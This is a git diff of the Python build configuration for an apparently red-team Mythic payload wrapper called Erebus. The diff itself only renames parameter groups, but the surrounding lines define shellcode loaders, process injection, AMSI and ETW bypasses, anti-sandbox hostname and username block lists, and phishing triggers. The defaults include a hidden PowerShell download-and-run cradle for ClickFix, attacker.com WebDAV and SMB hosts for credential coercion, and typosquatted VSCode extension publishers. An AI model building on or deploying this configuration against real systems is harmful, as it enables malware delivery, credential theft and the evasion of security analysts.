@@ -358,7 +358,7 @@ class ErebusWrapper(PayloadType):
     build_parameters = [
         BuildParameter(
             name="0.0 Target OS",
-            group_name="Target Platform",
+            group_name="0 - Target Platform",
             parameter_type=BuildParameterType.ChooseOne,
             description=(
                 "Target operating system. Selects the appropriate trigger set. "
@@ -370,7 +370,7 @@ class ErebusWrapper(PayloadType):
 
         BuildParameter(
             name = "0.0 Main Payload Type",
-            group_name="Target Platform",
+            group_name="0 - Target Platform",
             parameter_type = BuildParameterType.ChooseOne,
             description = """Select the main payload type (Shellcode Loader or DLL Hijack)
 NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Loader` and C for `Hijack`.
@@ -381,7 +381,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name = "0.0a Enable Custom Shellcode",
-            group_name="Shellcode Source",
+            group_name="1 - Shellcode Source",
             parameter_type = BuildParameterType.Boolean,
             description = (
                 "Upload custom raw shellcode from an external C2 (e.g. Cobalt Strike, Havoc, Sliver). "
@@ -395,7 +395,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name = "0.0b Custom Shellcode File",
-            group_name="Shellcode Source",
+            group_name="1 - Shellcode Source",
             parameter_type = BuildParameterType.File,
             description = (
                 "Raw shellcode blob to use instead of the Mythic-wrapped payload "
@@ -409,7 +409,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name = "0.0c Enable Donut",
-            group_name="Shellcode Source",
+            group_name="1 - Shellcode Source",
             parameter_type = BuildParameterType.Boolean,
             description = (
                 "Convert a PE (.exe/.dll) or .NET assembly to raw shellcode via Donut "
@@ -424,7 +424,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name = "0.0d Donut Input File",
-            group_name="Shellcode Source",
+            group_name="1 - Shellcode Source",
             parameter_type = BuildParameterType.File,
             description = "PE (.exe/.dll) or .NET assembly to convert to shellcode via Donut.",
             required = False,
@@ -435,7 +435,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name = "0.0e Donut Architecture",
-            group_name="Shellcode Source",
+            group_name="1 - Shellcode Source",
             parameter_type = BuildParameterType.ChooseOne,
             description = "Target architecture for Donut shellcode generation.",
             choices = ["x64", "x86", "x86+x64"],
@@ -448,7 +448,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name = "0.0f Donut Args",
-            group_name="Shellcode Source",
+            group_name="1 - Shellcode Source",
             parameter_type = BuildParameterType.String,
             description = "Optional command-line arguments passed to the Donut payload at runtime.",
             default_value = "",
@@ -460,7 +460,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name = "0.0g Build All Configurations",
-            group_name="Shellcode Source",
+            group_name="1 - Shellcode Source",
             parameter_type = BuildParameterType.Boolean,
             description = (
                 "Build all trigger types and all container types "
@@ -474,7 +474,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name = "0.1 Loader Type",
-            group_name="Windows Loader",
+            group_name="2 - Windows Loader",
             parameter_type = BuildParameterType.ChooseOne,
             description = "Select the type of loader to use",
             choices = ["ClickOnce", "Shellcode Loader", "VM Loader"],
@@ -487,7 +487,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name = "0.2 Loader Format",
-            group_name="Windows Loader",
+            group_name="2 - Windows Loader",
             parameter_type = BuildParameterType.ChooseOne,
             description = (
                 "Select the loader's output format. "
@@ -510,7 +510,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name = "0.2a Loader Architecture",
-            group_name="Windows Loader",
+            group_name="2 - Windows Loader",
             parameter_type = BuildParameterType.ChooseOne,
             description = "Select the target architecture for the loader",
             choices = ["x64", "x86"],
@@ -523,7 +523,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name = "0.3 Loader Build Configuration",
-            group_name="Windows Loader",
+            group_name="2 - Windows Loader",
             parameter_type = BuildParameterType.ChooseOne,
             description = "Select the loader's build config. Release is the shippable mode: symbols stripped, rich header scrubbed, PE timestamp zeroed, debug directory blob wiped. Debug keeps symbols and leaves forensic metadata intact - use only for local testing.",
             choices = ["release", "debug", "test"],
@@ -536,7 +536,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name = "0.3 ClickOnce Build Configuration",
-            group_name="Windows Loader",
+            group_name="2 - Windows Loader",
             parameter_type = BuildParameterType.ChooseOne,
             description = "Select the loader's build config.",
             choices = ["debug", "release"],
@@ -549,7 +549,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name = "0.3a ClickOnce Architecture",
-            group_name="Windows Loader",
+            group_name="2 - Windows Loader",
             parameter_type = BuildParameterType.ChooseOne,
             description = "Select the target architecture for the ClickOnce loader",
             choices = ["x64", "x86"],
@@ -563,7 +563,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
         # Shellcode Loader Injection Configuration
         BuildParameter(
             name = "0.4 Shellcode Loader - Injection Type",
-            group_name="Windows Loader",
+            group_name="2 - Windows Loader",
             parameter_type = BuildParameterType.ChooseOne,
             description = """Select the injection technique for the Shellcode Loader:
 1 = NtMapViewOfSection (Remote)
@@ -586,7 +586,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
         # VM Loader Injection Configuration (self-injection only)
         BuildParameter(
             name = "0.4a VM Loader - Injection Type",
-            group_name="Windows Loader",
+            group_name="2 - Windows Loader",
             parameter_type = BuildParameterType.ChooseOne,
             description = """Select the self-injection technique for the VM Loader:
 2 = CreateFiber (Self)
@@ -603,7 +603,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
         # ── Linux Loader ──────────────────────────────────────────────────────
         BuildParameter(
             name="0.1-L Linux Loader Type",
-            group_name="Linux Loader",
+            group_name="3 - Linux Loader",
             parameter_type=BuildParameterType.ChooseOne,
             description="Linux loader output format. ELF = standalone executable. SO = shared object (for LD_PRELOAD delivery).",
             choices=["ELF", "Shared Object"],
@@ -615,7 +615,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name="0.2a-L Linux Architecture",
-            group_name="Linux Loader",
+            group_name="3 - Linux Loader",
             parameter_type=BuildParameterType.ChooseOne,
             description="Target CPU architecture for the Linux loader.",
             choices=["x86_64", "aarch64"],
@@ -627,7 +627,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name="0.3-L Linux Build Configuration",
-            group_name="Linux Loader",
+            group_name="3 - Linux Loader",
             parameter_type=BuildParameterType.ChooseOne,
             description="Release strips symbols and minimises binary size. Debug retains symbols for local testing.",
             choices=["release", "debug"],
@@ -639,7 +639,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name="0.4-L Linux Injection Type",
-            group_name="Linux Loader",
+            group_name="3 - Linux Loader",
             parameter_type=BuildParameterType.ChooseOne,
             description=(
                 "Linux shellcode execution technique:\n"
@@ -657,7 +657,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name="0.5-L Linux Enable Guardrails",
-            group_name="Linux Loader",
+            group_name="3 - Linux Loader",
             parameter_type=BuildParameterType.Boolean,
             description="Enable compile-time anti-analysis checks in the Linux loader.",
             default_value=False,
@@ -668,7 +668,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name="0.5a-L Linux Check ptrace",
-            group_name="Linux Loader",
+            group_name="3 - Linux Loader",
             parameter_type=BuildParameterType.Boolean,
             description="Detect active ptrace attachment by reading /proc/self/status TracerPid.",
             default_value=True,
@@ -680,7 +680,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name="0.5b-L Linux Check Container",
-            group_name="Linux Loader",
+            group_name="3 - Linux Loader",
             parameter_type=BuildParameterType.Boolean,
             description="Detect Docker/LXC/container execution via /proc/self/cgroup keyword scan.",
             default_value=True,
@@ -692,7 +692,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name="0.5c-L Linux Blocked Hostnames",
-            group_name="Linux Loader",
+            group_name="3 - Linux Loader",
             parameter_type=BuildParameterType.String,
             description="Comma-separated hostname substrings to block (case-insensitive).",
             default_value="sandbox,malware,cuckoo,any.run",
@@ -704,7 +704,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name="0.5d-L Linux Blocked Usernames",
-            group_name="Linux Loader",
+            group_name="3 - Linux Loader",
             parameter_type=BuildParameterType.String,
             description="Comma-separated username substrings to block (case-insensitive).",
             default_value="analyst,malware,sandbox,user",
@@ -716,7 +716,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name="0.5e-L Linux Process Masquerade",
-            group_name="Linux Loader",
+            group_name="3 - Linux Loader",
             parameter_type=BuildParameterType.Boolean,
             description="Rename the loader process via prctl(PR_SET_NAME) to hide it in ps/top.",
             default_value=True,
@@ -727,7 +727,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name="0.5f-L Linux Masquerade Name",
-            group_name="Linux Loader",
+            group_name="3 - Linux Loader",
             parameter_type=BuildParameterType.String,
             description="Process name to masquerade as (default mimics a kernel worker thread).",
             default_value="[kworker/u:0]",
@@ -740,7 +740,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
         # ── macOS Loader ───────────────────────────────────────────────────────
         BuildParameter(
             name="0.1-M macOS Loader Type",
-            group_name="macOS Loader",
+            group_name="4 - macOS Loader",
             parameter_type=BuildParameterType.ChooseOne,
             description="macOS loader output format. MachO = standalone executable. Dylib = dynamic library.",
             choices=["MachO", "Dylib"],
@@ -752,7 +752,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name="0.2a-M macOS Architecture",
-            group_name="macOS Loader",
+            group_name="4 - macOS Loader",
             parameter_type=BuildParameterType.ChooseOne,
             description="Target CPU architecture. 'universal' produces a fat binary (x86_64 + arm64) via lipo.",
             choices=["x86_64", "arm64", "universal"],
@@ -764,7 +764,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name="0.3-M macOS Build Configuration",
-            group_name="macOS Loader",
+            group_name="4 - macOS Loader",
             parameter_type=BuildParameterType.ChooseOne,
             description="Release strips symbols. Debug retains them for local testing.",
             choices=["release", "debug"],
@@ -776,7 +776,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name="0.4-M macOS Injection Type",
-            group_name="macOS Loader",
+            group_name="4 - macOS Loader",
             parameter_type=BuildParameterType.ChooseOne,
             description=(
                 "macOS shellcode execution technique:\n"
@@ -794,7 +794,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name="0.5-M macOS Enable Guardrails",
-            group_name="macOS Loader",
+            group_name="4 - macOS Loader",
             parameter_type=BuildParameterType.Boolean,
             description="Enable compile-time anti-analysis checks in the macOS loader.",
             default_value=False,
@@ -805,7 +805,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name="0.5a-M macOS Deny Attach",
-            group_name="macOS Loader",
+            group_name="4 - macOS Loader",
             parameter_type=BuildParameterType.Boolean,
             description="Call ptrace(PT_DENY_ATTACH) at startup - kills any debugger that subsequently attaches.",
             default_value=True,
@@ -817,7 +817,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name="0.5b-M macOS Check Debug",
-            group_name="macOS Loader",
+            group_name="4 - macOS Loader",
             parameter_type=BuildParameterType.Boolean,
             description="Detect active debugger via sysctl KERN_PROC P_TRACED flag.",
             default_value=True,
@@ -829,7 +829,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name="0.5c-M macOS Check Timing",
-            group_name="macOS Loader",
+            group_name="4 - macOS Loader",
             parameter_type=BuildParameterType.Boolean,
             description="Detect single-stepping via mach_absolute_time loop timing (> 500 ms threshold).",
             default_value=False,
@@ -841,7 +841,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name="0.5d-M macOS Blocked Hostnames",
-            group_name="macOS Loader",
+            group_name="4 - macOS Loader",
             parameter_type=BuildParameterType.String,
             description="Comma-separated hostname substrings to block (case-insensitive).",
             default_value="sandbox,malware,analyst",
@@ -853,7 +853,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name="0.5e-M macOS Blocked Usernames",
-            group_name="macOS Loader",
+            group_name="4 - macOS Loader",
             parameter_type=BuildParameterType.String,
             description="Comma-separated username substrings to block (case-insensitive).",
             default_value="analyst,malware,sandbox",
@@ -866,7 +866,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
         # ── Windows-only ────────────────────
         BuildParameter(
             name = "0.5 Shellcode Loader - Target Process",
-            group_name="Windows Loader",
+            group_name="2 - Windows Loader",
             parameter_type = BuildParameterType.String,
             description = "Target process for remote injection",
             default_value = "C:\\Windows\\System32\\notepad.exe",
@@ -883,7 +883,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
         # Guardrails Configuration
         BuildParameter(
             name = "0.5a Enable Guardrails",
-            group_name="Guardrails",
+            group_name="5 - Guardrails",
             parameter_type = BuildParameterType.Boolean,
             description = "Enable guardrails (environment and anti-debugging checks) for the loader",
             default_value = False,
@@ -894,7 +894,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name = "0.5b Check IsDebuggerPresent",
-            group_name="Guardrails",
+            group_name="5 - Guardrails",
             parameter_type = BuildParameterType.Boolean,
             description = "Enable check for IsDebuggerPresent and PEB.BeingDebugged flag",
             default_value = True,
@@ -906,7 +906,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name = "0.5c Check Remote Debugger",
-            group_name="Guardrails",
+            group_name="5 - Guardrails",
             parameter_type = BuildParameterType.Boolean,
             description = "Enable check for remote debugger via NtQueryInformationProcess",
             default_value = True,
@@ -918,7 +918,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name = "0.5d Check Debugger Processes",
-            group_name="Guardrails",
+            group_name="5 - Guardrails",
             parameter_type = BuildParameterType.Boolean,
             description = "Enable check for known debugger and analysis tool processes",
             default_value = True,
@@ -930,7 +930,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name = "0.5e Check Hardware Breakpoints",
-            group_name="Guardrails",
+            group_name="5 - Guardrails",
             parameter_type = BuildParameterType.Boolean,
             description = "Enable check for hardware breakpoints in debug registers",
             default_value = True,
@@ -942,7 +942,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name = "0.5f Check Timing Anomalies",
-            group_name="Guardrails",
+            group_name="5 - Guardrails",
             parameter_type = BuildParameterType.Boolean,
             description = "Enable timing-based debugger detection (RDTSC and Sleep checks)",
             default_value = False,
@@ -954,7 +954,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name = "0.5f1 Check Sandbox Environment",
-            group_name="Guardrails",
+            group_name="5 - Guardrails",
             parameter_type = BuildParameterType.Boolean,
             description = "Detect VMs and sandboxes (hypervisor CPUID, low resources, sandbox artifacts, no recent user activity)",
             default_value = False,
@@ -966,7 +966,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name = "0.5f2 Check System Uptime",
-            group_name="Guardrails",
+            group_name="5 - Guardrails",
             parameter_type = BuildParameterType.Boolean,
             description = (
                 "Reject environments where system uptime is below the configured minimum. "
@@ -983,7 +983,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name = "0.5f3 Minimum Uptime Seconds",
-            group_name="Guardrails",
+            group_name="5 - Guardrails",
             parameter_type = BuildParameterType.String,
             description = "Minimum system uptime in seconds required to proceed (default: 300 = 5 minutes).",
             default_value = "300",
@@ -997,7 +997,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name = "0.5f4 Check Screen Resolution",
-            group_name="Guardrails",
+            group_name="5 - Guardrails",
             parameter_type = BuildParameterType.Boolean,
             description = (
                 "Require a minimum screen resolution of 1280x1024. Sandboxes and analyst VMs "
@@ -1013,7 +1013,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name = "0.5f5 Check Secure Boot",
-            group_name="Guardrails",
+            group_name="5 - Guardrails",
             parameter_type = BuildParameterType.Boolean,
             description = (
                 "Require UEFI Secure Boot to be enabled (registry: HKLM\\SYSTEM\\CurrentControlSet\\"
@@ -1030,7 +1030,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name = "0.5g Hostname Whitelist",
-            group_name="Guardrails",
+            group_name="5 - Guardrails",
             parameter_type = BuildParameterType.String,
             description = "Comma-separated list of allowed hostnames (e.g., TARGET-PC,VICTIM-WORKSTATION). Leave empty to disable.",
             default_value = "",
@@ -1042,7 +1042,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name = "0.5h Block Analysis Hostnames",
-            group_name="Guardrails",
+            group_name="5 - Guardrails",
             parameter_type = BuildParameterType.String,
             description = "Comma-separated list of blocked hostnames (e.g., SANDBOX,MALWARE-ANALYSIS,VM-WIN10)",
             default_value = "SANDBOX,MALWARE-ANALYSIS,VM-WIN10,ANALYST-PC",
@@ -1054,7 +1054,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name = "0.5i Block Analysis Usernames",
-            group_name="Guardrails",
+            group_name="5 - Guardrails",
             parameter_type = BuildParameterType.String,
             description = "Comma-separated list of blocked usernames (e.g., analyst,malware,sandbox,user,admin)",
             default_value = "analyst,malware,sandbox,user,admin",
@@ -1066,7 +1066,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name = "0.5j IP Whitelist",
-            group_name="Guardrails",
+            group_name="5 - Guardrails",
             parameter_type = BuildParameterType.String,
             description = "Comma-separated IP prefixes to allow (e.g., 10.,192.168.50.). Leave empty to disable.",
             default_value = "",
@@ -1078,7 +1078,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name = "0.5k IP Blacklist",
-            group_name="Guardrails",
+            group_name="5 - Guardrails",
             parameter_type = BuildParameterType.String,
             description = "Comma-separated IP prefixes to block (e.g., 192.168.122.,172.16.,127.)",
             default_value = "192.168.122.,172.16.,127.",
@@ -1090,7 +1090,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name = "0.5l Domain Whitelist",
-            group_name="Guardrails",
+            group_name="5 - Guardrails",
             parameter_type = BuildParameterType.String,
             description = "Comma-separated list of allowed domains (e.g., CORP.CONTOSO.COM,TARGET-DOMAIN.LOCAL). Leave empty to disable.",
             default_value = "",
@@ -1105,7 +1105,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
         # loader (Shellcode Loader + DLL Hijack); ClickOnce is unaffected.
         BuildParameter(
             name = "0.5m Syscall Backend",
-            group_name="Evasion",
+            group_name="6 - Evasion",
             parameter_type = BuildParameterType.ChooseOne,
             description = (
                 "Syscall dispatch layer for Nt* calls.\n"
@@ -1123,7 +1123,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name = "0.5n Callstack Spoofing",
-            group_name="Evasion",
+            group_name="6 - Evasion",
             parameter_type = BuildParameterType.Boolean,
             description = (
                 "Enable Callstack Spoofing"
@@ -1144,7 +1144,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
         # into the host process - defaults cover every Win32 process.
         BuildParameter(
             name = "0.5o Callstack Spoof Modules",
-            group_name="Evasion",
+            group_name="6 - Evasion",
             parameter_type = BuildParameterType.String,
             description = (
                 "Comma-separated module names scanned for the `add rsp, 0x68; ret` gadget. "
@@ -1165,7 +1165,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
         # Sleep Obfuscation Configuration
         BuildParameter(
             name = "0.5p Sleep Obfuscation",
-            group_name="Evasion",
+            group_name="6 - Evasion",
             parameter_type = BuildParameterType.ChooseOne,
             description = (
                 "Pre-injection dwell mode.\n"
@@ -1188,7 +1188,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name = "0.5v Single Instance",
-            group_name="Loader Options",
+            group_name="7 - Loader Options",
             parameter_type = BuildParameterType.Boolean,
             description = (
                 "Create a named Global\\ mutex on startup to prevent duplicate beacons. "
@@ -1206,7 +1206,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name = "0.5q Sleep Base MS",
-            group_name="Evasion",
+            group_name="6 - Evasion",
             parameter_type = BuildParameterType.String,
             description = "Base dwell in milliseconds before injection. Actual dwell = base + random(0, jitter).",
             default_value = "5000",
@@ -1220,7 +1220,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name = "0.5r Sleep Jitter MS",
-            group_name="Evasion",
+            group_name="6 - Evasion",
             parameter_type = BuildParameterType.String,
             description = "Maximum random milliseconds added to the base dwell. Set to 0 for fixed dwell.",
             default_value = "3000",
@@ -1234,7 +1234,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name = "0.5s AMSI Bypass Type",
-            group_name="Evasion",
+            group_name="6 - Evasion",
             parameter_type = BuildParameterType.ChooseOne,
             description = (
                 "AMSI bypass depth:\n"
@@ -1255,7 +1255,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name = "0.5t ETW Bypass Type",
-            group_name="Evasion",
+            group_name="6 - Evasion",
             parameter_type = BuildParameterType.ChooseOne,
             description = (
                 "ETW bypass depth:\n"
@@ -1276,7 +1276,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 
         BuildParameter(
             name = "0.5u Unhook Scope",
-            group_name="Evasion",
+            group_name="6 - Evasion",
             parameter_type = BuildParameterType.ChooseOne,
             description = (
                 "DLL unhook breadth:\n"
@@ -1297,7 +1297,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
         # ClickOnce Loader Injection Configuration
         BuildParameter(
             name = "0.6 ClickOnce - Injection Method",
-            group_name="ClickOnce",
+            group_name="8 - ClickOnce",
             parameter_type = BuildParameterType.ChooseOne,
             description = """Select the injection method for ClickOnce:
 earlycascade (remote)
@@ -1315,7 +1315,7 @@ appdomain (self)""",
 
         BuildParameter(
             name = "0.7 ClickOnce - Target Process",
-            group_name="ClickOnce",
+            group_name="8 - ClickOnce",
             parameter_type = BuildParameterType.String,
             description = "Target process for remote injection methods (leave empty for explorer.exe)",
             default_value = "explorer.exe",
@@ -1328,7 +1328,7 @@ appdomain (self)""",
 
         BuildParameter(
             name="0.8 Output Extension Source",
-            group_name="Triggers",
+            group_name="11 - Triggers",
             parameter_type=BuildParameterType.ChooseOne,
             description="Choose source for the payload ignition and visible extension inside the container (Trigger or MalDoc)",
             choices=["Trigger", "MalDoc"],
@@ -1337,7 +1337,7 @@ appdomain (self)""",
 
         BuildParameter(
             name="0.9 Trigger Type",
-            group_name="Triggers",
+            group_name="11 - Triggers",
             parameter_type=BuildParameterType.ChooseOne,
             description=f"Type of Trigger to toggle decoy and execution. LNK Unavailabe in {semver}",
             choices=["LNK", "BAT", "MSI", "MSC", "HTML", "ClickFix", "HTA", "URL", "JS", "CHM", "SVG", "HTML-Encrypted", "HTML-Geofenced", "SearchMS", "UDL", "QR", "AppDomain", "VSCode"],
@@ -1352,7 +1352,7 @@ appdomain (self)""",
 
         BuildParameter(
             name="0.9-L Linux Trigger Type",
-            group_name="Triggers",
+            group_name="11 - Triggers",
             parameter_type=BuildParameterType.ChooseOne,
             description="Trigger delivery mechanism for Linux targets.",
             choices=["Bash", "Desktop", "HTML", "QR"],
@@ -1365,7 +1365,7 @@ appdomain (self)""",
 
         BuildParameter(
             name="0.9-M macOS Trigger Type",
-            group_name="Triggers",
+            group_name="11 - Triggers",
             parameter_type=BuildParameterType.ChooseOne,
             description="Trigger delivery mechanism for macOS targets.",
             choices=["Command", "AppleScript", "PKG", "HTML", "QR"],
@@ -1378,7 +1378,7 @@ appdomain (self)""",
 
         BuildParameter(
             name = "0.9a Trigger Binary",
-            group_name="Triggers",
+            group_name="11 - Triggers",
             parameter_type = BuildParameterType.String,
             description = "Choose a command to run when the trigger is executed.",
             default_value = "C:\\Windows\\System32\\conhost.exe",
@@ -1398,7 +1398,7 @@ appdomain (self)""",
 
         BuildParameter(
             name = "0.9b Trigger Command",
-            group_name="Triggers",
+            group_name="11 - Triggers",
             parameter_type = BuildParameterType.String,
             description = "Choose a command to run when the trigger is executed.",
             default_value = "--headless cmd.exe /Q /c erebus.exe | decoy.pdf",
@@ -1418,7 +1418,7 @@ appdomain (self)""",
 
         BuildParameter(
             name="0.9w VSCode Fake Name",
-            group_name="Triggers",
+            group_name="11 - Triggers",
             parameter_type=BuildParameterType.String,
             description="VSCode extension internal name shown in the Extensions panel. Typosquat a known publisher (e.g. 'vscode-python-tools', 'prettier-vscode').",
             default_value="vscode-python-tools",
@@ -1432,7 +1432,7 @@ appdomain (self)""",
 
         BuildParameter(
             name="0.9x VSCode Publisher",
-            group_name="Triggers",
+            group_name="11 - Triggers",
             parameter_type=BuildParameterType.String,
             description="VSCode extension publisher field shown in the Extensions panel. Typosquat a known publisher (e.g. 'ms-python', 'esbenp', 'dbaeumer').",
             default_value="ms-python",
@@ -1446,7 +1446,7 @@ appdomain (self)""",
 
         BuildParameter(
             name="0.9c ClickFix Command",
-            group_name="Triggers",
+            group_name="11 - Triggers",
             parameter_type=BuildParameterType.String,
             description="Command copied to clipboard when user clicks verify button. Use a PowerShell download cradle or cmd chain.",
             default_value='powershell -w hidden -ep bypass -c "iwr -uri PAYLOAD_URL -outfile $env:TEMP\\update.exe; & $env:TEMP\\update.exe"',
@@ -1459,7 +1459,7 @@ appdomain (self)""",
 
         BuildParameter(
             name="0.9d URL Target",
-            group_name="Triggers",
+            group_name="11 - Triggers",
             parameter_type=BuildParameterType.String,
             description=(
                 "Target URL for the internet shortcut (.url) trigger.\n"
@@ -1478,7 +1478,7 @@ appdomain (self)""",
 
         BuildParameter(
             name="0.9e HTML Password",
-            group_name="Triggers",
+            group_name="11 - Triggers",
             parameter_type=BuildParameterType.String,
             description="Password required to decrypt and trigger the payload. Stored as PBKDF2 hash in HTML - prevents automated sandbox detonation.",
             default_value="Passw0rd!",
@@ -1492,7 +1492,7 @@ appdomain (self)""",
 
         BuildParameter(
             name="0.9f Allowed Countries",
-            group_name="Triggers",
+            group_name="11 - Triggers",
             parameter_type=BuildParameterType.String,
             description="Comma-separated ISO-3166-1 alpha-2 country codes to allow (e.g. US,GB,CA). Visitors outside these countries are redirected to the fallback URL.",
             default_value="US,GB,CA,AU,DE,FR",
@@ -1506,7 +1506,7 @@ appdomain (self)""",
 
         BuildParameter(
             name="0.9g Geofence Fallback URL",
-            group_name="Triggers",
+            group_name="11 - Triggers",
             parameter_type=BuildParameterType.String,
             description="URL to redirect blocked visitors to (e.g. https://www.microsoft.com). Leave blank for silent fail.",
             default_value="https://www.microsoft.com",
@@ -1520,7 +1520,7 @@ appdomain (self)""",
 
         BuildParameter(
             name="0.9h WebDAV Host",
-            group_name="Triggers",
+            group_name="11 - Triggers",
             parameter_type=BuildParameterType.String,
             description="Attacker-controlled WebDAV host for search-ms trigger (no scheme/port, e.g. dav.attacker.com).",
             default_value="dav.attacker.com",
@@ -1534,7 +1534,7 @@ appdomain (self)""",
 
         BuildParameter(
             name="0.9i WebDAV Share",
-            group_name="Triggers",
+            group_name="11 - Triggers",
             parameter_type=BuildParameterType.String,
             description="WebDAV share path (e.g. share). Files served from this share have no MOTW.",
             default_value="share",
@@ -1548,7 +1548,7 @@ appdomain (self)""",
 
         BuildParameter(
             name="0.9j UDL Attacker Host",
-            group_name="Triggers",
+            group_name="11 - Triggers",
             parameter_type=BuildParameterType.String,
             description="Attacker-controlled SMB listener hostname or IP for UDL Net-NTLM coercion.",
             default_value="attacker.com",
@@ -1562,7 +1562,7 @@ appdomain (self)""",
 
         BuildParameter(
             name="0.9k QR Code URL",
-            group_name="Triggers",
+            group_name="11 - Triggers",
             parameter_type=BuildParameterType.String,
             description="URL to encode in the QR code. The URL has no plaintext representation in the HTML source - defeats link scanner URL extraction.",
             default_value="https://login.microsoftonline.com/",
